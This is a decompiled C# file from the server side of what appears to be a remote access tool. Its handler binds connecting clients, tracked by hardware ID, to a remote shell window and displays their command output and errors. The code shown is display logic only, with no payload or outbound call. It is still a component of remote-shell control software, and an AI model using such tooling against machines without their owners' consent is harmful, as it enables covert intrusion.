using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000064 RID: 100
	internal class HandlerShell
	{
		// Token: 0x060001FF RID: 511 RVA: 0x00020BAC File Offset: 0x0001EDAC
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "Shell"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormShell form = (FormShell)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						RichTextBox richTextBox = form.richTextBox1;
						richTextBox.Text += (string)objects[2];
						form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
						form.richTextBox1.ScrollToCaret();
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormShell form = (FormShell)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						RichTextBox richTextBox = form.richTextBox1;
						richTextBox.Text = richTextBox.Text + "Error: " + (string)objects[2] + "\n";
					}));
					return;
				}
			}
			else
			{
				FormShell form = (FormShell)Application.OpenForms["Shell:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Shell [" + (string)objects[2] + "]";
					form.client = client;
					form.richTextBox1.Enabled = true;
					form.rjTextBox1.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
